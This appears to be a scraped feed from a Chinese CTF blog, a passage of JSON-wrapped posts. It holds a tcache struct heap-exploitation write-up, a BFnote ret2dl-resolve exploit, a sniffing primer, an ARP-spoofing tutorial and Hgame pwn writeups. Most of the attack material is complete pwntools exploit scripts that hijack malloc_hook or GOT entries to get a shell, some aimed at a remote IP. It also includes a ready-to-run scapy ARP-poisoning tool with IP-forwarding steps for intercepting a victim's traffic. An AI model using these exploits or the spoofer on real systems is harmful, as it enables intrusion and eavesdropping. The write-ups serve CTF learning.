输入的chunk的size只能为0~0x100， delete操作只能进行3次， add操作只能进行7次 由于这些限制， 就不能通过常规的释放7次chunk填满tcache bin的方法来让chunk进入unsortedbin中， 这里用到的是对tcache struct的攻击tcache struct 的结构， tcache结构体是用_int_malloc函数进行分配内存空间的, 所以tcache结构体位于堆中， 而不在main_arena中 12345typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS];//0x40个字节， 每个字节都是不同大小的tcache bin中的chunk的个数 tcache_entry \\*entries[TCACHE_MAX_BINS];//0x40 ， 每八个字节对应不同大小的tcache bin中的链表头指针&#125; tcache_perthread_struct; 在pwndbg中使用vmmap 查看heap的地址， 再用x 指令查看内存中的内容, 可以发现tcache struct 的结构其实就是一个大小为0x250的chunk 标号1 方框的内容就是 char counts[TCACHE_MAX_BINS], 这里我用’\\xff’ 填充了， 这样让tcache_conunts达到最大， 之后符合unsortedbin大小的chunk经过free后就会进入unsorted bin中地址0x5640b8256010 的第一个字节的大小对应 tcache bin[20]的chunk的个数， 之后依次类推地址0x556f49cf6050 以8个字节为单位， 依次对应每个tceche bin 的头指针，也就是tcache_entry 那么解本题的思路为1.首先进行double free 再结合uaf漏洞， 可以获得tcache struct的地址并且可以控制这块内存， 之后把全部bin的counts填满到最大， 之后再把这个chunk free后即可泄露libc地址2.接下来就是如何控制malloc_hook, 可以再一次分配chunk的地址到tcache struct上， 不过这次不需要控制tcache_counts, 要控制tcache_entry, 覆盖tcache_entry为malloc_hook的地址， 之后再分配合适大小的chunk即可从malloc_hook处开始分配 这里bin[30] 的tcache_entry指针被修改成了malloc_hook - 0x13的地址， 接下来只要输入size为0x20即可获得可以控制malloc_hook的chunk3.覆写malloc_hook为one_gadget或realloc， 取决于栈环境是否要调整 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#!/usr/bin/python2from pwn import *import sysimport os#context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level = 'debug'debug = 1def pwn(): if debug == 1: exceve = \"./vn_pwn_easyTHeap\" p = process(exceve) if sys.argv[1] == '1': gdb.attach(p) else: ip = \"\" port = \"\" p = remote(ip, port) def add(size): p.sendlineafter(\"choice: \", str(1)) p.sendlineafter(\"size?\", str(size)) def edit(idx, content): p.sendlineafter(\"choice: \", str(2)) p.sendafter(\"idx?\", str(idx)) p.sendafter(\"content:\", content) def show(idx): p.sendlineafter(\"choice: \", str(3)) p.sendlineafter(\"idx?\", str(idx)) def free(idx): p.sendlineafter(\"choice: \", str(4)) p.sendlineafter(\"idx?\", str(idx)) elf = ELF(exceve) libc = ELF(\"./eth_libc-2.27.so\") add(0x50) #0 free(0) free(0) show(0) heap_leak = u64(p.recvline()[:-1].ljust(8, '\\x00')) add(0x50) #1 edit(1, p64(heap_leak - 0x250)) add(0x50) #2 add(0x50) #3 edit(3, '\\xff'*0x38) free(3) show(3) leak = u64(p.recvline()[:-1].ljust(8, '\\x00')) libc_base = leak - (0x7fa10bacbca0 - 0x7fa10b6e0000) log.info(\"libc_base -&gt; \" + hex(libc_base)) malloc_hook = libc_base + libc.symbols['__malloc_hook'] realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget = [0x4f2c5, 0x4f322, 0x10a38c] log.info(\"malloc_hook -&gt; \" + hex(malloc_hook)) log.info(\"heap_leak -&gt; \" + hex(heap_leak)) add(0x50) #4 payload = '\\x00'*0x48 + p64(malloc_hook - 0x13) edit(4, payload) add(0x20) #5 edit(5, '\\x00'*(0x13-8) + p64(libc_base + one_gadget[1]) + p64(realloc + 8)) add(0x10) p.interactive() if __name__ == '__main__': pwn() 结果: –再记录下了解tcache struct attack 之前我的解法 1.由于tcache bin不会检查double free， 所以可以通过double free， 之后再free一次即可让tcache_counts 为-1， 而在后续进行检查的时候tcache_counts是被当作一个无符号数来看待的， 所以也能通过这种方式使得chunk进入unsorted bin中， 从而leak出libc地址 2.由于同一个chunk进行了多次free操作， 在tcache bin中也就会有一条链表里面都是同一个chunk， 这时可以通过add操作， 获得这个chunk的指针， 使得可以让这个chunk在tcache bin中又能向这个chunk输入数据， 那么可以控制chunk的fd指针为 malloc_hook - 0x13, 之后再分配chunk即可， 但是由于题目限制只能add七次， 我在把malloc_hook 覆写成one_gadget的地方处止步， 无法在调用malloc也就无法进行攻击了…","tags":[{"name":"tcache struct attack","slug":"tcache-struct-attack","permalink":"http://wafuter.jxustctf.top/tags/tcache-struct-attack/"}]},{"title":"i春秋网络安全联赛2020 BFnote 复现","date":"2020-02-29T13:21:28.000Z","path":"2020/02/29/i春秋网络安全联赛2020-BFnote-复现/","text":"盯着伪代码看了一段时间， 没有想法， 之后直接去看官方wp了， 发现了几个知识盲区， 学到了一点 本题考点为绕过canary， 按照官方wp的说法, 当前函数被调用的时候当前线程的tcbhead.stack_guard会放置到栈上， 放到栈上后也就是canary,而在tcb块在被mmap分配地址的时候会初始化在libc内存布局上方， 要控制这个tcbhead.stack_guard就得先得到tcb块附近的地址， 而malloc在分配的size超过128KB(也就是0x200000)时会也会调用mmap， 分配的地址也在libc内存布局上方 知道这点后就可以结合栈溢出漏洞以及后面的基于堆地址任意写就可以修改canary， 进行栈迁移从而利用ret2dl-reslove来getshell 复习一下 ret2dl-reslove 构造payload过程大致是先由ret 跳到plt[0]， 此处的代码是进入_dl_runtime_resolve(link_map, reloc_arg)的入口，第一条push 指令讲link_map入栈， link_map里面存有JMPREL, SYMTAB, STRTAB表的地址， 第二个参数会由相应函数的plt表中的push指令压栈之后再把伪造的.rel.plt数据的地址距 JMPREL表的地址偏移入栈， 之后便会进行第一步跳转，到对应函数的rel表项，取得距SYMTAB的偏移，也就是r_info&gt;&gt;8之后再跳转到SYMTAB取得st_name, 获得要调用的函数的函数名在STRTAB表中的偏移最后找到函数名的字符串，之后调用函数 rel 0x804a440 - 0x80483d0 = 0x2070sym 0x804a428 - 0x80481d8 = 0x2250str 0x804a448 - 0x80482c8 = 0x2180 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *import sysimport os#context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level='debug'debug = 1d = 1def pwn(): execve = \"./BFnote\" if debug == 1: p = process(execve) if d == 1: gdb.attach(p) else: #ip = \"10.0.%s.140\" % sys.argv[1] ip = \"\" host = \"\" p = remote(ip, host) def Give_des(des): p.sendlineafter(\"Give your description :\", des) def Post_des(des): p.sendlineafter(\"Give your postscript :\", des) def Notesize(size): p.sendlineafter(\"Give your notebook size :\", str(size)) def Titlesize(size): p.sendlineafter(\"Give your title size :\", str(size)) def Title(t): p.sendafter(\"Give your title : \", t) def Note(n): p.sendlineafter(\"Give your note :\", p32(n)) elf = ELF(\"./BFnote\") libc = ELF(\"bfnote_libc.so.6\") bss = 0x804A060 + 0x3a8 + 4 stdout = elf.symbols['stdout'] dl_resolve_data=\"\\x80\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x12\\x00\\x00\\x00\\x37\\x66\\x66\\x5a\\x6d\\x59\\x50\\x47\\x60\\xa1\\x04\\x08\\x07\\x25\\x02\\x00\\x73\\x79\\x73\\x74\\x65\\x6d\\x00\" dl_resolve_call=\"\\x50\\x84\\x04\\x08\\x70\\x20\\x00\\x00\" Give_des('\\x00'*0x32 + p32(0x12345678) + '\\x00'*0x4 + p32(bss)) payload = \"s\"*0x3a8 + dl_resolve_call + p32(0x12345678) + p32(0x804A060 + 0x3b8) + \"/bin/sh\\x00\" + p64(0) + dl_resolve_data Post_des(payload) Notesize(0x200000) Titlesize(0x20170c - 0x10) p.sendlineafter(\"invalid ! please re-enter :\", str(100)) Title(\"1234\") raw_input() Note(0x12345678) p.interactive()if __name__ == '__main__': pwn()","tags":[{"name":"ret2dl-reslove, 绕过canary","slug":"ret2dl-reslove-绕过canary","permalink":"http://wafuter.jxustctf.top/tags/ret2dl-reslove-%E7%BB%95%E8%BF%87canary/"}]},{"title":"网络嗅探初学","date":"2020-02-24T13:02:08.000Z","path":"2020/02/24/网络嗅探初学/","text":"以太网网卡的工作模式以太网网卡是我们日常生活中见得最多的网卡，常用的以太网卡支持以下工作模式：广播模式、多播模式、直接模式和混杂模式。 1.广播模式（Broad Cast Model）:它的物理地址（MAC）地址是 0Xffffff 的帧为广播帧，工作在广播模式的网卡接收广播帧。它将会接收所有目的地址为广播地址的数据包，一般所有的网卡都会设置为这个模式。 2.多播传送（MultiCast Model）：多播传送地址作为目的物理地址的帧可以被组内的其它主机同时接收，而组外主机却接收不到。但是，如果将网卡设置为多播传送模式，它可以接收所有的多播传送帧，而不论它是不是组内成员。当数据包的目的地址为多播地址，而且网卡地址是属于那个多播地址所代表的多播组时，网卡将接纳此数据包，即使一个网卡并不是一个多播组的成员，程序也可以将网卡设置为多播模式而接收那些多播的数据包。 3.直接模式（Direct Model）:工作在直接模式下的网卡只接收目地址是自己 Mac地址的帧。只有当数据包的目的地址为网卡自己的地址时，网卡才接收它。 4.混杂模式（Promiscuous Model）:工作在混杂模式下的网卡接收所有的流过网卡的帧，信包捕获程序就是在这种模式下运行的。网卡的缺省工作模式包含广播模式和直接模式，即它只接收广播帧和发给自己的帧。如果采用混杂模式，网卡将接受同一网络内所有主机发送的数据包。 设置网卡为混杂模式ifconfig eth0 Promisc 输入ifconfig 后第一行出现PROMISC 即表示当前为混杂模式 ifconfig eth0 -promisc 取消混杂模式 kali linux 上安装vscode1.先去官网下载.deb安装包2.执行命令sudo dpkg -i .debsudo apt-get install -f # Install dependencies –python with 关键字任何实现了 enter() 和 exit() 方法的对象都可称之为上下文管理器，上下文管理器对象可以使用 with 关键字 1234567891011121314class File(): def __init__(self, filename, mode): self.filename = filename self.mode = mode def __enter__(self): print(\"entering\") self.f = open(self.filename, self.mode) return self.f def __exit__(self, *args): print(\"will exit\") self.f.close() enter() 方法返回资源对象，这里就是你将要打开的那个文件对象，exit() 方法处理一些清除工作。 因为 File 类实现了上下文管理器，现在就可以使用 with 语句了。 socket.gethostname() – 获取主机名 socket.gethostname()‘kali’ RAW SOCKET 有关函数解释– socket.gethostbyname()根据主机名获取本机的ip 地址 – socket.socket 函数详解socket(family,type[,protocol])参数一：family 指定应用程序使用的通信协议的协议族，对于TCP/IP协议族，该参数为AF_INET参数二：type 是要创建套接字的类型,socket.SOCK_RAW: 原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以；其次，SOCK_RAW也可以处理特殊的IPv4报文；此外，利用原始套接字，可以通过IP_HDRINCL套接字选项由用户构造IP头。参数三：protocol 指明所要接收的协议类型，通常为0或者不填。socket.IPPROTO_IP: 相当于protocol=0，此时用于接收任何的IP数据包。其中的校验和和协议分析由程序自己完成。 – socket.setsockopt 函数详解socket.setsockopt(level,optname, value)默认的socket选项不够用的时候，就必须要使用setsockopt来调整s.setsockopt(socket.SOL_SOCKET，socket.SO_REUSEADDR, 1) level：选项定义的层次。支持SOL_SOCKET、IPPROTO_TCP、IPPROTO_IP和IPPROTO_IPV6。可以取三种值: 1)SOL_SOCKET: 通用套接字选项. 2)IPPROTO_IP: IP选项. 3)IPPROTO_TCP: TCP选项. optname：需设置的选项。SO_REUSEADDR： 允许重用本地地址和端口 数据类型为int该选项可以让多个socket对象绑定到相同的地址和端口上。value: 设置选项的值。","tags":[{"name":"网络嗅探","slug":"网络嗅探","permalink":"http://wafuter.jxustctf.top/tags/%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/"}]},{"title":"ARP协议欺骗初学","date":"2020-02-23T04:44:05.000Z","path":"2020/02/23/wireshark-学习一/","text":"只看http 协议的数据包Analize -&gt; display filter -&gt; http hypertext transfer protocol(ok) -&gt; apply 保存数据包先stop 抓取数据包 -&gt; File -&gt; save arp协议/rarp协议在TCP/IP协议族中， 数据链路层主要有三个目的:1.为IP模块发送和接收数据2.为ARP模块发送APR请求和接收ARP应答3.为RARP模块发送RAPT请求和接收RARP应答 在以太网协议中规定，同一局域网中的一台主机要和另一台主机进行直接通信，必须要知道目标主机的MAC地址。而在TCP/IP协议中，网络层和传输层只关心目标主机的IP地址。这就导致在以太网中使用IP协议时，数据链路层的以太网协议接到上层IP协议提供的数据中，只包含目的主机的IP地址。于是需要一种方法，根据目的主机的IP地址，获得其MAC地址。这就是ARP协议要做的事情。所谓地址解析（address resolution）就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。 另外，当发送主机和目的主机不在同一个局域网中时，即便知道对方的MAC地址，两者也不能直接通信，必须经过路由转发才可以。所以此时，发送主机通过ARP协议获得的将不是目的主机的真实MAC地址，而是一台可以通往局域网外的路由器的MAC地址。于是此后发送主机发往目的主机的所有帧，都将发往该路由器，通过它向外发送。这种情况称为委托ARP或ARP代理（ARP Proxy）。 一.ARP协议 将IP地址转换成MAC地址工作原理在每台安装有TCP/IP协议的计算机或路由器里都有一个ARP缓存表，表里的IP地址与MAC地址是一对应的 以主机A（192.168.38.10）向主机B（192.168.38.11）发送数据为例。 1.当发送数据时，主机A会在自己的ARP缓存表中寻找是否有目标IP地址。如果找到就知道目标MAC地址为（00-BB-00-62-C2-02），直接把目标MAC地址写入帧里面发送就可。 2.如果在ARP缓存表中没有找到相对应的IP地址，主机A就会在网络上发送一个广播（ARP request），目标MAC地址是“FF.FF.FF.FF.FF.FF”，这表示向同一网段内的所有主机发出这样的询问：“192.168.38.11的MAC地址是什么？” 3.网络上其他主机并不响应ARP询问，只有主机B接收到这个帧时，才向主机A做出这样的回应（ARP response）：“192.168.38.11的MAC地址是00-BB-00-62-C2-02”，此回应以单播方式。这样，主机A就知道主机B的MAC地址，它就可以向主机B发送信息。同时它还更新自己的ARP高速缓存（ARP cache），下次再向主机B发送信息时，直接从ARP缓存表里查找就可。 ARP缓存表采用老化机制，在一段时间内如果表中的某一行没有使用，就会被删除，这样可减少缓存表的长度，加快查询速度。 免费ARP（gratuitous ARP），他是指主机发送ARP查询（广播）自己的IP地址，当ARP功能被开启或者是端口初始配置完成，主机向网络发送免费ARP来查询自己的IP地址确认地址唯一可用 作用:确定网络中是否有其他主机使用了IP地址，如果有应答则产生错误消息。免费ARP可以做更新ARP缓存用，网络中的其他主机收到该广播则在缓存中更新条目，收到该广播的主机无论是否存在与IP地址相关的条目都会强制更新，如果存在旧条目则会将MAC更新为广播包中的MAC。 二.RARP协议 将MAC地址转换成IP地址， 其因为较限于IP地址的运用以及其他的一些缺点，因此渐为更新的BOOTP或DHCP所取代 数据包结构类似于ARP的报文格式主要差别在于帧类型代码为0x8035（ARP为0x0806），操作码为3请求（ARP为1），4应答（ARP为2）。 工作原理1.发送主机发送一个本地的RARP广播，在此广播包中，声明自己的MAC地址并且请求任何收到此请求的RARP服务器分配一个IP地址；2.本地网段上的RARP服务器收到此请求后，检查其RARP列表，查找该MAC地址对应的IP地址；3.如果存在，RARP服务器就给源主机发送一个响应数据包并将此IP地址提供给对方主机使用；4.如果不存在，RARP服务器对此不做任何的响应；5.源主机收到从RARP服务器的响应信息，就利用得到的IP地址进行通讯；如果一直没有收到RARP服务器的响应信息，表示初始化失败。 arp -a 查看本节ARP缓存表 sudo arp -d -i en0 -a/ip neigh flush dev eth0 清空ARP缓存 ARP 欺骗原理ARP工作时，首先请求主机会发送出一个含有所希望到达的IP地址的以太网广播数据包，然后目标IP的所有者会以一个含有IP和MAC地址对的数据包应答请求主机。这样请求主机就能获得要到达的IP地址对应的MAC地址，同时请求主机会将这个地址对放入自己的ARP表缓存起来，以节约不必要的ARP通信。ARP缓存表采用了老化机制，在一段时间内如果表中的某一行没有使用，就会被删除。 局域网上的一台主机，如果接收到一个ARP报文，即使该报文不是该主机所发送的ARP请求的应答报文，该主机也会将ARP报文中的发送者的MAC地址和IP地址更新或加入到ARP表中。 ARP欺骗攻击就利用了这点，攻击者主动发送ARP报文，发送者的MAC地址为攻击者主机的MAC地址，发送者的IP地址为被攻击主机的IP地址。通过不断发送这些伪造的ARP报文，让局域网上所有的主机和网关ARP表，其对应的MAC地址均为攻击者的MAC地址，这样所有的网络流量都会发送给攻击者主机。由于ARP欺骗攻击导致了主机和网关的ARP表的不正确，这种情况我们也称为ARP中毒。 个人理解:攻击者发送arp应答报文给 被攻击者主机和网关, 伪造 发送者的IP地址为被攻击者主机的IP地址，伪造发送者的MAC地址为攻击者的MAC地址那么被攻击者主机和网关的ARP表中都存在被攻击者IP地址：攻击者MAC地址 之后当 被攻击者向网关发送ARP请求时 查找目标主机的MAC地址， 返回的是攻击者的MAC地址， 那么网络流量都会发送到攻击者的主机上 使用optparse模块中的OptionParser类来格式化用户输入和用法提醒 Ether 参数 ls(Ether)│dst : DestMACField = (None)│src : SourceMACField = (None)│type : XShortEnumField = (36864│)构造一个以太网数据包通常需要指定目标和源MAC地址，如果不指定，默认发出的就是广播包Ether().show()│###[ Ethernet ]###│ dst = ff:ff:ff:ff:ff:ff│ src = 00:00:29:22:4f:22│ type = 0x9000 ARP构造函数得参数列表:│&gt;&gt;&gt; ls(ARP)│hwtype : XShortField = (1)│ptype : XShortEnumField = (2048)│hwlen : FieldLenField = (None)│plen : FieldLenField = (None)│op : ShortEnumField = (1)│hwsrc : MultipleTypeField = (None)│psrc : MultipleTypeField = (None)│hwdst : MultipleTypeField = (None)│pdst : MultipleTypeField = (None) op。取值为1或者2，代表ARP请求或者响应包。hwsrc。发送方Mac地址。psrc。发送方IP地址。hwdst。目标Mac地址。pdst。目标IP地址。 定向欺骗现在来构造数据包就很容易了，回到我们最初的目标，我们想告诉192.168.1.23这台主机网关地址为192.168.1.102所在的主机，构造的数据包应该是这样的： pkt = Ether(src=[1.102的MAC], dst=[1.18的Mac]) / ARP(1.102的MAC, 网关IP地址, hwdst=1.18MAC, pdst=1.18IP地址, op=2)上面的代码我们不论是以太网数据包还是ARP数据包，我们都明确指定了来源和目标，在ARP数据包中，我们将Kali Linux的Mac地址和网关的IP地址进行了绑定，op取值为2，作为一个响应包被 1.18 接到，这样 1.18会更新自己的ARP缓存表，造成中毒，从而 1.18 发往网关的数据包都会被发往 1.102。 那么我们如果要欺骗网关，把网关发往1.18的数据包都发送到Kali Linux（1.102）上，根据上面的代码稍作修改即可： pkt = Ether(src=[1.102的MAC], dst=[网关的Mac]) / ARP(1.102的MAC, 1. 18地址, hwdst=网关MAC, pdst=网关IP地址, op=2)上面构造的两个数据包都是ARP响应包，其实发送请求包也可以进行毒化，请求包毒化的原理是，我们请求时候使用假的源IP和MAC地址，目标主机同样会更新自己的路由表。 ARP请求的方式欺骗主机，构造的ARP包如下： pkt = Ether(src=[1.102的MAC], dst=[1. 18的Mac]) / ARP(1.102的MAC, 网关IP地址, hwdst=1. 18MAC, pdst=1. 18IP地址, op=1)ARP请求的方式欺骗网关，构造的ARP包如下： pkt = Ether(src=[1.102的MAC], dst=[网关的Mac]) / ARP(1.102的MAC, 1. 18地址, hwdst=网关MAC, pdst=网关IP地址, op=1)我们看到构造ARP请求和响应的主要区别在op的值。 –个人理解:ARP(1.102的MAC, 1.18的地址， hwdst=网关MAC， pdst=网关IP地址， op=2)构造这样的arp应答包 给网关的话 会使网关的arp表 更新或加入一条 1.18的地址:1.102的MAC 的记录 ARP(1.102的MAC, 网关IP地址， hwdst=1.18MAC， pdst=1.18IP地址，op=2)构造这样的arp应答包 给被欺骗主机的话会使被欺骗主机的arp表 更新或加入一条 网关IP地址：1.102的MAC 的记录 广播欺骗目前我们欺骗的方式都是一对一欺骗的，事实上我们可以发送广播包，对所有主机进行欺骗。 广播欺骗，首先以太网数据包直接构造一个广播包，ARP包不用填写目标主机的信息即可。 下面是ARP广播响应包的构造方式： pkt = Ether(src=mac, dst=’ff:ff:ff:ff:ff:ff’) / ARP(hwsrc=mac, psrc=args[0], op=2)最后综合定下和广播欺骗的方式，我们总结一个公式出来： pkt = Ether(src=攻击机MAC, dst=被欺骗主机（或网关）MAC) / ARP((hwsrc=毒化记录中的MAC, 毒化记录中的IP, hwdst=被欺骗主机MAC, pdst=被欺骗主机IP地址, op=1（或2）) 打开linux中的ip转发功能 echo 1 &gt; /proc/sys/net/ipv4/ip_forward永久保存修改：改变/etc/sysctl.conf 设置ip_forward=1查看windows主机上的ip地址 ipconfig/all -&gt; ipv4地址查看linux 网关地址: netstat -rn/ route -n arpspoof 安装命令sudo apt-get install -y dsniff ssldump arp 编程实战12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182# -*- coding: UTF-8 -*-import sysimport osimport timefrom optparse import OptionParserfrom scapy.all import ( get_if_hwaddr, getmacbyip, ARP, Ether, sendp)def main(): try: if os.geteuid() != 0: print(\"[-] please run this program as root\") sys.exit(1) except Exception as msg: print(msg) usage = 'Usage: %prog [-i interface] [-t target] host' parser = OptionParser(usage) parser.add_option('-i', dest='interface', help='wangka') parser.add_option('-t', dest='target', help='deadbeef') parser.add_option('-m', dest='mode', default='reettercap -T -q -M ARP /172.17.171.21// /q', help='virus mode: requests (req) \\ or replies (rep) [default: %default]') parser.add_option('-s', action='store_true', dest='summary', default=False, help='message') (options, args) = parser.parse_args() if len(args) != 1 or options.interface is None: parser.print_help() sys.exit(0) def build_req(): if options.target is None: pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=args, pdst=arg[0]) elif options.target: target_mac = getmacbyip(options.target) if target_mac is None: print(\"[-] Error: failed to get target\\'s mac\\'s addr\") sys.exit(1) pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, \\ pdst = options.target) return pkt def build_rep(): if options.target is None: pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=args[0], op=2) elif options.target: target_mac = getmacbyip(options.target) if target_mac is None: print(\"[-] Error: failed to get target's mac's addr\") sys.exit(1) pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, \\ pdst=options.target, op=2) return pkt mac = get_if_hwaddr(options.interface) # get local mac addr print('local mac\\' addr is %s' % mac) if options.mode == 'req': pkt = build_req() elif options.mode == 'rep': pkt = build_rep() if options.summary is True: pkt.show() ans = input('\\n[*] is going on? [Y|n]: ').lower() if ans == 'y' or len(ans) == 0: pass else: sys.exit(0) while True: sendp(pkt, inter=2, iface=options.interface)if __name__ == '__main__': main() 在终端中输入sudo python3 -i eth0 -m rep -t 192.168.0.108 192.168.0.1 -i 指定的网卡-m rep 表示发送应答数据包， req表示发送请求数据包-t 表示发送的目标主机192.168.0.108 表示windows上的主机的IP地址192.168.0.1 表示网关地址 通过向windows上的主机发送伪造的arp数据包 更新网关的mac的地址为攻击机的mac地址， 从而达到监控流量的目的 arp欺骗攻击前： arp欺骗攻击后: 可以看到网关的mac地址被修改成了攻击机的mac地址， 之后被攻击的主机所发送的流量都可以被监控","tags":[{"name":"wireshark基本操作， ARP欺骗原理与实践","slug":"wireshark基本操作，-ARP欺骗原理与实践","permalink":"http://wafuter.jxustctf.top/tags/wireshark%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%EF%BC%8C-ARP%E6%AC%BA%E9%AA%97%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"}]},{"title":"Hgame-week2-writeup","date":"2020-02-01T14:58:26.000Z","path":"2020/02/01/Hgame-week2-writeup/","text":"findyourself咕咕咕 Roc826s_Note堆题， 开了栈上数据不可执行和栈溢出保护 能进行add， dele， show操作， 存在uaf漏洞， 但是没有edit操作， 不能直接在chunk中布置数据但是可以通过double free 往已经free的chunk中输入数据， 之后就是劫持malloc_hook为one_gadget就可以getshell了 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677781 from pwn import *2 import sys3 import os45 context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])6 #context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])7 context.log_level='debug'8 debug = 09 d = 01011 def pwn():12 execve = \"./Roc826\"13 if debug == 1:14 p = process(execve)15 if d == 1:16 gdb.attach(p)17 else:18 #ip = \"10.0.%s.140\" % sys.argv[1]19 ip = \"47.103.214.163\"20 host = \"21002\"21 p = remote(ip, host)2223 elf = ELF(\"./Roc826\")24 libc = ELF(\"roc_libc-2.23.so\")2526 def add(size, content):27 p.sendlineafter(\":\", str(1))2829 p.sendlineafter(\"size?\", str(size))30 p.sendlineafter(\"content:\", content)3132 def free(idx):33 p.sendlineafter(\":\", str(2))3435 p.sendlineafter(\"index?\", str(idx))3637 def show(idx):38 p.sendlineafter(\":\", str(3))3940 p.sendlineafter(\"index?\", str(idx))4142 add(0x90, \"\\x00\") #043 add(0x90, \"\\x00\") #144 free(0)4546 show(0)4748 p.recvuntil(\"content:\")49 leak = u64(p.recv(6).ljust(8, '\\x00'))50 libc_base = leak - (0x7fee89dbbb78 - 0x7fee899f7000)51 malloc_hook = libc_base + libc.symbols['__malloc_hook']52 realloc = libc_base + libc.symbols['__libc_realloc']53 one_gadget = [libc_base+0x45216, libc_base+0x4526a, libc_base+0xf02a4, libc_base+0xf1147]54 log.info(\"leak -&gt; \" + hex(libc_base))55 #log.info(\"one_gadget -&gt; \" + hex(one_gadget[0]))5657 add(0x90, '\\x00') #25859 add(0x68, '\\x00') #360 add(0x68, '\\x00') #461 add(0x68, '\\x00') #562 free(3)63 free(4)64 free(3)65 add(0x68, p64(malloc_hook - 0x23)*2) #66667 add(0x68, '\\x00') #768 add(0x68, '\\x00') #869 #add(0x68, 'a'*0xb + p64(one_gadget[1]) + p64(realloc + 4)) #970 add(0x68, 'a'*0x13 + p64(one_gadget[3]))7172 p.sendlineafter(\":\", str(1))73 p.sendlineafter(\"size?\", str(20))7475 p.interactive()7677 if __name__ == '__main__':78 pwn() Another_Heaven保护跟Roc826_note一样 看程序好像没什么溢出的地方， 看了一眼没什么点子 之后反复看了上面的两个地方发现好像可以爆破， 之后写了脚本就爆破出来了 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344451 from pwn import *2 from string import printable3 import sys4 import os56 context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])7 #context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])8 context.log_level='debug'9 debug = 010 d = 11112 flag = \"\"13 addr = 0x6021611415 while True:16 for i in printable:17 flag += i18 execve = \"./AH\"19 if debug == 1:20 p = process(execve)21 if d == 1:22 gdb.attach(p)23 else:24 #ip = \"10.0.%s.140\" % sys.argv[1]25 ip = \"47.103.214.163\"26 host = \"21001\"27 p = remote(ip, host)2829 account = \"E99p1ant\\0\"30 p.sendlineafter('There is a back door...\\\"Hacked by Annevi!\\\"', str(addr))31 p.send('\\0')3233 p.sendlineafter(\"Account:\", account)34 p.sendlineafter(\"Password:\", flag + '\\0')3536 if p.recv(2) == \"Wr\":37 flag = flag[:-1]38 p.close()39 continue40 else:41 addr += 142 break43 if len(flag) &gt;= 0x30:44 print \"flag -&gt; \" + flag45 break 形而上的坏死保护除了可以改写重定位表 其它都开了 我看这题就是为难我胖虎，把一个8字节空间拆成两个4字节空间来用， 一开始没看出来搞得我晕晕的，不过解题的思路不难想 这里的v2变量的低4个字节和高四个字节各有作用 布置$rbp - 0xb8 的数据为0x5ffffffeb, 高4位上的数据是5， 地址为$rbp - 0xb4， 这样可以泄露libc地址， 进而得到libc基址 低4位上的数据为0xffffffeb， 也就是-0xa8, 这是处在bss段的变量e99与puts的got表地址的偏移 最后就是劫持puts的got表地址为one_gadget就可以getshell了 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556571 # -*- coding: utf-8 -*-2 from pwn import *3 import binascii4 import sys5 import os67 context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 #context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 11213 def pwn():14 execve = \"./Metaphysical_Necrosis\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"47.103.214.163\"22 host = \"21003\"23 p = remote(ip, host)2425 elf = ELF(\"./Metaphysical_Necrosis\")26 libc = ELF(\"mn_libc-2.23.so\")2728 p.sendlineafter(\"你要把C4安放在哪里呢？\", str(-21))29 p.sendline(\"\\xeb\\xff\\xff\\xff\\x05\\x00\\x00\\x00\")3031 #p.recvuntil(\"the bomb has been planed!\\n\")32 p.send('\\n')33 #p.recvuntil(\"你说吼不吼啊！\")34 p.send('\\n')3536 p.sendlineafter(\"名字:\", \"hanpi\")37 p.sendlineafter(\"你打算把它切成几段呢？\", str(0))3839 raw_input()40 p.sendlineafter(\"请问它经过的路程是__m:\", str(25769803755))41 p.recvuntil(\"Terrorist Win\")4243 print p.recvline()44 leak = u64(p.recv(6).ljust(8, '\\x00'))45 libc_base = leak - 240 - libc.symbols['__libc_start_main']46 one_gadget = [libc_base+0x45216, libc_base+0x4526a, libc_base+0xf02a4, libc_base+0xf1147]47 log.info(\"libc_base -&gt; \" + hex(libc_base))48 log.info(\"one_gadget -&gt; \" + hex(one_gadget[1]))4950 raw_input()51 #print \"&gt;&gt;&gt;\" + binascii.a2b_hex(str(hex(one_gadget[0])[2:]))[::-1]52 p.sendlineafter(\"啊~~！~？~…____\", binascii.a2b_hex(str(hex(one_gadget[0])[2:]))[::-1])5354 p.interactive()5556 if __name__ == '__main__':57 pwn() 最后记一个知识点 123&gt;&gt;&gt;import binascii&gt;&gt;&gt; 